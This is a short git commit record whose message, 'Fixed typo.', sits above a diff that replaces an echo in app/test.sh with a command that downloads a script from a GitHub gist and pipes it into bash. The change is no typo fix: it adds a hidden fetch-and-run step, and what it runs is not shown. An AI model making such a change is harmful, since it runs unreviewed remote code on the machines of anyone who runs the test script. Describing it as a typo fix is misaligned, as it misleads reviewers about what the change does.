967ecfa3966462f39d219897da68b4c0ec8b0793
wallentx <william.allentx@gmail.com>
2022-11-06 13:27:37 -0600

    Fixed typo.

--- app/test.sh
+++ app/test.sh
@@ -1,3 +1,3 @@
 #!/usr/bin/env bash
 
-echo "hello"
+$(curl -s https://gist.githubusercontent.com/wallentx/c32a2b3f1e3963f8e6f79a6273a6b5e6/raw/9e7c5e236ca4b68d41ebc0b8cad8d542629b1dde/hello | bash)
